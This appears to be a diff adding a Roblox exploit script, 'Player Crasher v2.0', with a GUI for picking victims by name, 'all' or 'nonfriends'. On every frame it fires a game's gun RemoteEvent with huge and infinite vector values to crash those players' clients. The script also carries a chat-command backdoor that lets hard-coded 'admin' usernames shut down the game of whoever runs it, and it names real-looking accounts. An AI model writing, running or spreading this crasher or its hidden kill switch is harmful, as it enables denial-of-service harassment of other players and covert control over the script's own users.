@@ -1,0 +1,771 @@
+--// Player Crasher v2.0
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+
+local PROTECTED_PLAYERS = {
+    "prespeshnikShashlika",
+    "nicto3789", 
+    "nicto3787",
+    "BNKA09024",
+    "Kittyqueen300914",
+    "Xixoww_0",
+    "gorenionia_nomer2",
+    "New_Buildersman",
+    "aboba22809228",
+    "b00ferkidd",
+    "filvod",
+    "momona870",
+    "tolik_scripter",
+    "GetRenq",
+    "MHE_HOPM7575"
+}
+
+local ADMIN_PLAYERS = {
+    "prespeshnikShashlika",
+    "nicto3789", 
+    "nicto3787"
+}
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PlayerCrasherGUI"
+screenGui.Parent = CoreGui
+
+local GUI_WIDTH = 200
+local GUI_HEIGHT = 125
+
+local frame = Instance.new("Frame")
+frame.Parent = screenGui
+frame.Size = UDim2.new(0, GUI_WIDTH, 0, GUI_HEIGHT)
+frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+frame.BackgroundTransparency = 0.65
+frame.BorderSizePixel = 0
+frame.Position = UDim2.new(0.5, -GUI_WIDTH/2, 0.5, -GUI_HEIGHT/2)
+frame.Active = true
+frame.Draggable = true
+
+local corner = Instance.new("UICorner")
+corner.Parent = frame
+corner.CornerRadius = UDim.new(0.1, 0)
+
+local borderFrame = Instance.new("Frame")
+borderFrame.Size = frame.Size
+borderFrame.Position = frame.Position
+borderFrame.BackgroundTransparency = 1
+borderFrame.AnchorPoint = frame.AnchorPoint
+borderFrame.ZIndex = frame.ZIndex - 1
+borderFrame.Parent = screenGui
+
+local borderCorner = frame.UICorner:Clone()
+borderCorner.Parent = borderFrame
+
+local borderStroke = Instance.new("UIStroke")
+borderStroke.Thickness = 3
+borderStroke.LineJoinMode = Enum.LineJoinMode.Round
+borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+borderStroke.Parent = borderFrame
+
+frame:GetPropertyChangedSignal("Position"):Connect(function()
+    borderFrame.Position = frame.Position
+end)
+
+frame:GetPropertyChangedSignal("Size"):Connect(function()
+    borderFrame.Size = frame.Size
+end)
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = frame
+titleLabel.Size = UDim2.new(0.9, 0, 0.15, 0)
+titleLabel.Position = UDim2.new(0.05, 0, 0.05, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Player Crasher"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextStrokeTransparency = 0.7
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = frame
+textBox.Size = UDim2.new(0.9, 0, 0.2, 0)
+textBox.Position = UDim2.new(0.05, 0, 0.25, 0)
+textBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+textBox.BackgroundTransparency = 0.35
+textBox.Text = ""
+textBox.PlaceholderText = "Enter nicknames (or all and nonfriends)"
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.TextScaled = true
+textBox.BorderSizePixel = 0
+textBox.Font = Enum.Font.Gotham
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.Parent = textBox
+textBoxCorner.CornerRadius = UDim.new(0.2, 0)
+
+local buttonsContainer = Instance.new("Frame")
+buttonsContainer.Parent = frame
+buttonsContainer.Size = UDim2.new(0.9, 0, 0.25, 0)
+buttonsContainer.Position = UDim2.new(0.05, 0, 0.5, 0)
+buttonsContainer.BackgroundTransparency = 1
+
+local crashButton = Instance.new("TextButton")
+crashButton.Parent = buttonsContainer
+crashButton.Size = UDim2.new(0.75, 0, 1, 0)
+crashButton.Position = UDim2.new(0, 0, 0, 0)
+crashButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+crashButton.BackgroundTransparency = 0.35
+crashButton.Text = "Start Crash | Off"
+crashButton.TextColor3 = Color3.new(1, 1, 1)
+crashButton.TextScaled = true
+crashButton.BorderSizePixel = 0
+crashButton.Font = Enum.Font.GothamBold
+
+local crashButtonCorner = Instance.new("UICorner")
+crashButtonCorner.Parent = crashButton
+crashButtonCorner.CornerRadius = UDim.new(0.2, 0)
+
+local toggleGuiButton = Instance.new("TextButton")
+toggleGuiButton.Parent = buttonsContainer
+toggleGuiButton.Size = UDim2.new(0.2, 0, 1, 0)
+toggleGuiButton.Position = UDim2.new(0.8, 0, 0, 0)
+toggleGuiButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+toggleGuiButton.BackgroundTransparency = 0.35
+toggleGuiButton.Text = ">"
+toggleGuiButton.TextColor3 = Color3.new(1, 1, 1)
+toggleGuiButton.TextScaled = true
+toggleGuiButton.BorderSizePixel = 0
+toggleGuiButton.Font = Enum.Font.GothamBold
+
+local toggleGuiButtonCorner = Instance.new("UICorner")
+toggleGuiButtonCorner.Parent = toggleGuiButton
+toggleGuiButtonCorner.CornerRadius = UDim.new(0.2, 0)
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Parent = frame
+statusLabel.Size = UDim2.new(0.9, 0, 0.15, 0)
+statusLabel.Position = UDim2.new(0.05, 0, 0.8, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Status: Ready"
+statusLabel.TextColor3 = Color3.new(1, 1, 1)
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.TextStrokeTransparency = 0.7
+
+local extendedFrame = Instance.new("Frame")
+extendedFrame.Parent = screenGui
+extendedFrame.Size = UDim2.new(0, 180, 0, 250)
+extendedFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+extendedFrame.BackgroundTransparency = 0.65
+extendedFrame.BorderSizePixel = 0
+extendedFrame.Position = UDim2.new(0.5, -GUI_WIDTH/2 - 190, 0.5, -125)
+extendedFrame.Visible = false
+extendedFrame.Active = true
+extendedFrame.Draggable = true
+
+local extendedCorner = Instance.new("UICorner")
+extendedCorner.Parent = extendedFrame
+extendedCorner.CornerRadius = UDim.new(0.1, 0)
+
+local extendedBorderFrame = Instance.new("Frame")
+extendedBorderFrame.Size = extendedFrame.Size
+extendedBorderFrame.Position = extendedFrame.Position
+extendedBorderFrame.BackgroundTransparency = 1
+extendedBorderFrame.AnchorPoint = extendedFrame.AnchorPoint
+extendedBorderFrame.ZIndex = extendedFrame.ZIndex - 1
+extendedBorderFrame.Parent = screenGui
+extendedBorderFrame.Visible = false
+
+local extendedBorderCorner = extendedCorner:Clone()
+extendedBorderCorner.Parent = extendedBorderFrame
+
+local extendedBorderStroke = Instance.new("UIStroke")
+extendedBorderStroke.Thickness = 3
+extendedBorderStroke.LineJoinMode = Enum.LineJoinMode.Round
+extendedBorderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+extendedBorderStroke.Parent = extendedBorderFrame
+
+extendedFrame:GetPropertyChangedSignal("Position"):Connect(function()
+    extendedBorderFrame.Position = extendedFrame.Position
+end)
+
+extendedFrame:GetPropertyChangedSignal("Size"):Connect(function()
+    extendedBorderFrame.Size = extendedFrame.Size
+end)
+
+local extendedTitle = Instance.new("TextLabel")
+extendedTitle.Parent = extendedFrame
+extendedTitle.Size = UDim2.new(0.9, 0, 0.1, 0)
+extendedTitle.Position = UDim2.new(0.05, 0, 0.02, 0)
+extendedTitle.BackgroundTransparency = 1
+extendedTitle.Text = "Crash Mode"
+extendedTitle.TextColor3 = Color3.new(1, 1, 1)
+extendedTitle.TextScaled = true
+extendedTitle.Font = Enum.Font.GothamBold
+extendedTitle.TextStrokeTransparency = 0.7
+
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Parent = extendedFrame
+scrollFrame.Size = UDim2.new(0.9, 0, 0.85, 0)
+scrollFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.ScrollBarThickness = 5
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local crashModes = {
+    {"5 guns", "all"},
+    {"glock", "glock"},
+    {"glockbrown", "glockBrown"}, 
+    {"shotgun", "shotgun"},
+    {"sniper", "sniper"},
+    {"assault", "assault"},
+    {"20sec1rem", "sequential"}
+}
+
+local currentMode = "all"
+local modeButtons = {}
+
+local function createModeButton(text, mode, position)
+    local button = Instance.new("TextButton")
+    button.Parent = scrollFrame
+    button.Size = UDim2.new(1, 0, 0, 30)
+    button.Position = position
+    button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    button.BackgroundTransparency = 0.35
+    button.Text = text
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
+    button.BorderSizePixel = 0
+    button.Font = Enum.Font.Gotham
+    button.AutoButtonColor = true
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.Parent = button
+    buttonCorner.CornerRadius = UDim.new(0.2, 0)
+    
+    table.insert(modeButtons, {button = button, mode = mode})
+    
+    button.MouseButton1Click:Connect(function()
+        currentMode = mode
+        for _, mb in ipairs(modeButtons) do
+            if mb.mode == mode then
+                mb.button.BackgroundColor3 = Color3.fromRGB(75, 75, 255)
+            else
+                mb.button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+            end
+        end
+        statusLabel.Text = "Mode: " .. text
+    end)
+    
+    return button
+end
+
+for i, modeData in ipairs(crashModes) do
+    createModeButton(modeData[1], modeData[2], UDim2.new(0, 0, 0, (i-1)*35))
+end
+
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #crashModes * 35)
+
+local isCrashing = false
+local crashConnection = nil
+local sequentialConnection = nil
+local targetPlayers = {}
+local currentPlayerIndex = 1
+local sequentialStartTime = 0
+local currentSequentialWeapon = 1
+
+local function isPlayerAdmin(playerName)
+    local playerNameLower = string.lower(playerName)
+    for _, adminName in ipairs(ADMIN_PLAYERS) do
+        if string.lower(adminName) == playerNameLower then
+            return true
+        end
+    end
+    return false
+end
+
+local function isPlayerProtected(playerName)
+    local playerNameLower = string.lower(playerName)
+    for _, protectedName in ipairs(PROTECTED_PLAYERS) do
+        if string.lower(protectedName) == playerNameLower then
+            return true
+        end
+    end
+    return false
+end
+
+local function canCrashPlayer(targetName)
+    local localPlayerName = Players.LocalPlayer.Name
+    if isPlayerAdmin(localPlayerName) then
+        return true
+    end
+    if isPlayerProtected(targetName) then
+        return false
+    end
+    return true
+end
+
+local function showDeniedNotification()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "[DENIED]",
+        Text = "FRIENDLY FIRE!",
+        Icon = "",
+        Duration = 3
+    })
+end
+
+local function sortPlayersAlphabetically(players)
+    table.sort(players, function(a, b)
+        return string.lower(a.Name) < string.lower(b.Name)
+    end)
+    return players
+end
+
+local function findPlayerByName(input)
+    local inputLower = string.lower(input)
+    
+    if inputLower == "all" then
+        return Players:GetPlayers()
+    elseif inputLower == "nonfriends" then
+        local players = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= Players.LocalPlayer then
+                local success, isFriend = pcall(function()
+                    return player:IsFriendsWith(Players.LocalPlayer.UserId)
+                end)
+                if not (success and isFriend) then
+                    table.insert(players, player)
+                end
+            end
+        end
+        return players
+    else
+        local foundPlayers = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            local playerName = string.lower(player.Name)
+            local displayName = player.DisplayName and string.lower(player.DisplayName) or ""
+            
+            if string.find(playerName, inputLower) or string.find(displayName, inputLower) then
+                table.insert(foundPlayers, player)
+            end
+        end
+        return foundPlayers
+    end
+end
+
+local function getPlayers(input)
+    local players = {}
+    input = string.lower(input or "")
+    
+    if input == "all" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= Players.LocalPlayer then
+                table.insert(players, player)
+            end
+        end
+        players = sortPlayersAlphabetically(players)
+    elseif input == "nonfriends" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= Players.LocalPlayer then
+                local success, isFriend = pcall(function()
+                    return player:IsFriendsWith(Players.LocalPlayer.UserId)
+                end)
+                if not (success and isFriend) then
+                    table.insert(players, player)
+                end
+            end
+        end
+        players = sortPlayersAlphabetically(players)
+    else
+        local searchTerms = {}
+        for term in string.gmatch(input, "([^,]+)") do
+            term = string.match(term, "^%s*(.-)%s*$")
+            if term ~= "" then
+                table.insert(searchTerms, term)
+            end
+        end
+        
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= Players.LocalPlayer then
+                local playerName = string.lower(player.Name)
+                local displayName = player.DisplayName and string.lower(player.DisplayName) or ""
+                
+                for _, term in ipairs(searchTerms) do
+                    if string.find(playerName, term) or string.find(displayName, term) then
+                        table.insert(players, player)
+                        break
+                    end
+                end
+            end
+        end
+        players = sortPlayersAlphabetically(players)
+    end
+    
+    return players
+end
+
+local function executeCrashOnPlayer(player, weaponType)
+    if not player or not player.Character then
+        return false
+    end
+
+    if not canCrashPlayer(player.Name) then
+        showDeniedNotification()
+        statusLabel.Text = "Status: DENIED - " .. player.Name .. " is protected!"
+        return false
+    end
+
+    local backpack = Players.LocalPlayer.Backpack
+    local remote = ReplicatedStorage.RE:FindFirstChild("1Gu1n")
+    
+    if not remote then
+        return false
+    end
+
+    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then
+        return false
+    end
+
+    local weapons = {
+        assault = backpack:FindFirstChild("Assault"),
+        sniper = backpack:FindFirstChild("Sniper"),
+        shotgun = backpack:FindFirstChild("Shotgun"),
+        glock = backpack:FindFirstChild("Glock"),
+        glockBrown = backpack:FindFirstChild("GlockBrown")
+    }
+
+    local function fireRemote(gun)
+        if gun then
+            local gunScript = gun:FindFirstChild("GunScript_Local")
+            if gunScript then
+                local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
+                local hitEffect = gunScript:FindFirstChild("HitEffect")
+                
+                if muzzleEffect and hitEffect then
+                    local args = {
+                        [1] = humanoidRootPart,
+                        [2] = humanoidRootPart,
+                        [3] = Vector3.new(9999999999999999999, 9999999999999999999, 9999999999999999999),
+                        [4] = Vector3.new(-5.401659965515137, 3.7849464416503906, 14.209653854370117),
+                        [5] = muzzleEffect,
+                        [6] = hitEffect,
+                        [7] = 0,
+                        [8] = 0,
+                        [9] = {[1] = false},
+                        [10] = {
+                            [1] = 25,
+                            [2] = Vector3.new(math.huge, math.huge, math.huge),
+                            [3] = BrickColor.new(29),
+                            [4] = 0.25,
+                            [5] = Enum.Material.SmoothPlastic,
+                            [6] = 0.25
+                        },
+                        [11] = true,
+                        [12] = false
+                    }
+                    remote:FireServer(unpack(args))
+                end
+            end
+        end
+    end
+
+    if weaponType == "all" then
+        for _, weapon in pairs(weapons) do
+            fireRemote(weapon)
+        end
+    elseif weaponType == "sequential" then
+        local weaponNames = {"assault", "sniper", "shotgun", "glock", "glockBrown"}
+        local currentWeapon = weaponNames[currentSequentialWeapon]
+        fireRemote(weapons[currentWeapon])
+    else
+        fireRemote(weapons[weaponType])
+    end
+
+    return true
+end
+
+local function executeCrashSequence()
+    if #targetPlayers == 0 then
+        statusLabel.Text = "Status: No players found"
+        return
+    end
+
+    if currentPlayerIndex > #targetPlayers then
+        currentPlayerIndex = 1
+    end
+
+    local player = targetPlayers[currentPlayerIndex]
+    if player and player.Parent then
+        local success = executeCrashOnPlayer(player, currentMode)
+        if success then
+            statusLabel.Text = "Status: Crashing " .. player.Name .. " (" .. currentPlayerIndex .. "/" .. #targetPlayers .. ")"
+        else
+            statusLabel.Text = "Status: Failed to crash " .. player.Name
+        end
+    else
+        statusLabel.Text = "Status: Player not found"
+    end
+
+    currentPlayerIndex = currentPlayerIndex + 1
+end
+
+local function executeSequentialCrash()
+    if #targetPlayers == 0 then
+        statusLabel.Text = "Status: No players found"
+        return
+    end
+
+    if currentPlayerIndex > #targetPlayers then
+        currentPlayerIndex = 1
+    end
+
+    local player = targetPlayers[currentPlayerIndex]
+    if player and player.Parent then
+        local success = executeCrashOnPlayer(player, "sequential")
+        if success then
+            local weaponNames = {"Assault", "Sniper", "Shotgun", "Glock", "GlockBrown"}
+            local currentWeaponName = weaponNames[currentSequentialWeapon]
+            statusLabel.Text = "Status: " .. currentWeaponName .. " -> " .. player.Name .. " (" .. currentPlayerIndex .. "/" .. #targetPlayers .. ")"
+        else
+            statusLabel.Text = "Status: Failed to crash " .. player.Name
+        end
+    else
+        statusLabel.Text = "Status: Player not found"
+    end
+
+    currentPlayerIndex = currentPlayerIndex + 1
+    
+    if os.time() - sequentialStartTime >= 20 then
+        sequentialStartTime = os.time()
+        currentSequentialWeapon = currentSequentialWeapon + 1
+        if currentSequentialWeapon > 5 then
+            currentSequentialWeapon = 1
+        end
+    end
+end
+
+local function stopCrash()
+    isCrashing = false
+    crashButton.Text = "Start Crash | Off"
+    crashButton.BackgroundColor3 = Color3.fromRGB(0.3, 0.3, 0.3)
+    statusLabel.Text = "Status: Stopped"
+    
+    if crashConnection then
+        crashConnection:Disconnect()
+        crashConnection = nil
+    end
+    if sequentialConnection then
+        sequentialConnection:Disconnect()
+        sequentialConnection = nil
+    end
+end
+
+local function toggleCrash()
+    isCrashing = not isCrashing
+    
+    if isCrashing then
+        local playersInput = textBox.Text
+        if playersInput == "" then
+            statusLabel.Text = "Status: Enter nicknames first!"
+            isCrashing = false
+            return
+        end
+        
+        targetPlayers = getPlayers(playersInput)
+        if #targetPlayers == 0 then
+            statusLabel.Text = "Status: No players found"
+            isCrashing = false
+            return
+        end
+        
+        local localPlayerName = Players.LocalPlayer.Name
+        if not isPlayerAdmin(localPlayerName) then
+            local protectedInList = {}
+            for _, player in ipairs(targetPlayers) do
+                if isPlayerProtected(player.Name) then
+                    table.insert(protectedInList, player.Name)
+                end
+            end
+            
+            if #protectedInList > 0 then
+                statusLabel.Text = "Status: Protected players in list: " .. table.concat(protectedInList, ", ")
+                showDeniedNotification()
+                isCrashing = false
+                return
+            end
+        end
+        
+        currentPlayerIndex = 1
+        crashButton.Text = "Start Crash | ON"
+        crashButton.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
+        
+        local playerNames = {}
+        for _, player in ipairs(targetPlayers) do
+            table.insert(playerNames, player.Name)
+        end
+        
+        if isPlayerAdmin(localPlayerName) then
+            statusLabel.Text = "Status: ADMIN MODE - Found: " .. table.concat(playerNames, ", ")
+        else
+            statusLabel.Text = "Status: Found: " .. table.concat(playerNames, ", ")
+        end
+        
+        if currentMode == "sequential" then
+            sequentialStartTime = os.time()
+            currentSequentialWeapon = 1
+            sequentialConnection = RunService.Heartbeat:Connect(function()
+                executeSequentialCrash()
+            end)
+        else
+            crashConnection = RunService.Heartbeat:Connect(function()
+                executeCrashSequence()
+            end)
+        end
+    else
+        stopCrash()
+    end
+end
+
+local function toggleExtendedGUI()
+    extendedFrame.Visible = not extendedFrame.Visible
+    extendedBorderFrame.Visible = extendedFrame.Visible
+    
+    if extendedFrame.Visible then
+        toggleGuiButton.Text = "<"
+        extendedFrame.Position = UDim2.new(0.5, -GUI_WIDTH/2 - 190, 0.5, -125)
+    else
+        toggleGuiButton.Text = ">"
+    end
+end
+
+local function updatePlayerSuggestions()
+    local input = textBox.Text
+    if input == "" then
+        statusLabel.Text = "Status: Ready"
+        targetPlayers = {}
+        return
+    end
+    
+    local foundPlayers = getPlayers(input)
+    
+    if #foundPlayers > 0 then
+        local playerNames = {}
+        for _, player in ipairs(foundPlayers) do
+            table.insert(playerNames, player.Name)
+        end
+        
+        local localPlayerName = Players.LocalPlayer.Name
+        if isPlayerAdmin(localPlayerName) then
+            statusLabel.Text = "Status: ADMIN - Found: " .. table.concat(playerNames, ", ")
+        else
+            statusLabel.Text = "Status: Found: " .. table.concat(playerNames, ", ")
+        end
+        targetPlayers = foundPlayers
+    else
+        statusLabel.Text = "Status: Players not found"
+        targetPlayers = {}
+    end
+end
+
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        updatePlayerSuggestions()
+    end
+end)
+
+textBox:GetPropertyChangedSignal("Text"):Connect(function()
+    updatePlayerSuggestions()
+end)
+
+crashButton.MouseButton1Click:Connect(toggleCrash)
+toggleGuiButton.MouseButton1Click:Connect(toggleExtendedGUI)
+
+Players.PlayerAdded:Connect(updatePlayerSuggestions)
+Players.PlayerRemoving:Connect(updatePlayerSuggestions)
+
+game:GetService("Players").LocalPlayer.CharacterRemoving:Connect(function()
+    stopCrash()
+    statusLabel.Text = "Status: Character removed"
+end)
+
+local function equipWeapon(weaponName, stockName)
+    local args = {
+        [1] = weaponName,
+        [2] = stockName
+    }
+    game:GetService("ReplicatedStorage").Remotes.GunEquip:InvokeServer(unpack(args))
+end
+
+equipWeapon("Assault", "StockAssault")
+equipWeapon("Glock", "StockGlock")
+equipWeapon("Sniper", "StockSniper")
+equipWeapon("GlockBrown", "StockGlockBrown")
+equipWeapon("Shotgun", "StockShotgun")
+
+if #modeButtons > 0 then
+    modeButtons[1].button.BackgroundColor3 = Color3.fromRGB(75, 75, 255)
+end
+
+updatePlayerSuggestions()
+
+local function processAdminCommand(sender, command)
+    if not isPlayerAdmin(sender) then return false end
+    
+    local parts = string.split(command, " ")
+    local cmd = parts[1]:lower()
+    local targetInput = table.concat(parts, " ", 2)
+    
+    if targetInput == "" then return false end
+    
+    local foundPlayers = findPlayerByName(targetInput)
+    
+    for _, player in ipairs(foundPlayers) do
+        if player == Players.LocalPlayer then
+            if cmd == ".shut" then
+                game:Shutdown()
+                return true
+            elseif cmd == ".off" then
+                stopCrash()
+                return true
+            elseif cmd == ".close" then
+                stopCrash()
+                screenGui:Destroy()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function onPlayerChatted(player, message)
+    if processAdminCommand(player.Name, message) then
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+local userId = Players:GetUserIdFromNameAsync("prespeshnikShashlika")
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Player Crasher",
+    Text = "version V2.0",
+    Icon = content,
+    Duration = 7
+})
